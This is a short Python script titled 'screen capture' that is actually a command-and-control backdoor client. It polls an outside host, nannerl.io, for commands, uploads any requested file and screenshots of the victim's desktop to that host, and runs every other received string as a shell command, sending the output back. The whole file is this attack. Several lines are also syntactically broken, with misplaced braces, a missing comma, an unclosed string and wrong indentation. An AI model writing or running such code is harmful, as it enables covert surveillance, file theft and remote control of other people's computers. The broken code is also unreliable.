# screen capture

import requests
import subprocess
import os
import time

from PIL import ImageGrab

while True:
    req = requests.get('http://nannerl.io')
    command = req.text

    if 'terminate' in command:
        break

    elif 'grab' in command:
        grab, path = command.split('*')
        if os.path.exists(path):
            url = 'http://nannerl.io'
            files = {'file': open(path 'rb')}
            r = requests.post{url, files=files}
        else:
            post_response = requests.post{url = 'http://nannerl.io', data = '[-] file not found' }

        elif 'screencap' in command:
            ImageGrab.grab().save("img.png, "PNG")
            url = 'http://nannerl.io'
            files = {'file': open ("img.png", 'rb')}
            r = requests.post(url, files=files)

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            post_response = requests.post(url='http://nannerl.io', data=CMD.stdout.read() )
            post_response  = requests.post(url ='http://nannerl.io', data=CMD.stderr.read() )
      time.sleep(3)
